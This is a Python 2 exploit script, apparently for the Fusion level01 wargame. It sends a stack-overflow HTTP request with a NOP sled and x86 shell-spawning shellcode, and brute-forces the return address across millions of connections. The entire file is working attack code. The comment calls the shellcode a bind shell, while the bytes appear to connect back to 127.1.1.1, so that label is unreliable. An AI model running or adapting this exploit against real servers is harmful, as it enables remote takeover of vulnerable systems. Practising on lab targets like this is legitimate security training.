"""
This code is for fusion level01 challange.
Not complete yet.
"""
import socket
import sys
import re
import struct
from string import Template

def get_socket():
    try:
    #create an AF_INET, STREAM socket (TCP)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
    except socket.error, msg:
        print 'Failed to create socket. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1]
        sys.exit()

    print 'Socket Created'

    try:
        remote_ip = socket.gethostbyname( host )
    except socket.gaierror:
    #could not resolve
        print 'Hostname could not be resolved. Exiting'
        sys.exit()
    print 'Ip address of ' + host + ' is ' + remote_ip

    #Connect to remote server
    s.connect((remote_ip, int(port)))
    return s

host = sys.argv[1]
port = sys.argv[2]

try:
    EIP_byte1 = "\xbf\x00\x00\x00"
    #EIP_byte1 = "\xbf\x42\x42\x42"
    EIP_guess = "\x42\x42\x42"
#network bind shell listen 0.0.0.0 11111
    shellcode = "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x2b\x67\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
    overflow = "A"*139
    nops = "\x90"*128
    #command = "GET /$overflow$EIP_guess$EIP_byte1 HTTP/1.1i$nops$shellcode"
    command = "GET /$overflow$EIP_guess HTTP/1.1i$nops$shellcode"
    payload_template = Template(command)
    required_size = 128
    payload = payload_template.safe_substitute(EIP_byte1=EIP_byte1,EIP_guess=EIP_guess,nops=nops,overflow=overflow,shellcode=shellcode)

    for i in xrange(16777216):
        s = get_socket()
        #EIP_guess = hex(i)[2:].zfill(6))
        EIP_guess = hex(i)[2:].zfill(8)
        print EIP_guess
        print EIP_byte1
        import struct
        EIP_guess =  struct.pack('L', int(EIP_byte1.encode('hex'),16)+i)
        print EIP_guess.encode('hex')
        #payload = payload_template.safe_substitute(EIP_byte1=EIP_byte1,EIP_guess=EIP_guess,nops=nops,overflow=overflow,shellcode=shellcode)
        payload = payload_template.safe_substitute(EIP_guess=EIP_guess,nops=nops,overflow=overflow,shellcode=shellcode)

        print "Payloads size %s" %payload
        print payload
        s.sendall(payload)

        recv = s.recv(8086)
        print recv
        s.close()

except socket.error, e:
 #Send failed
    print 'Send failed. %s' % e
    sys.exit()

print 'Done.'
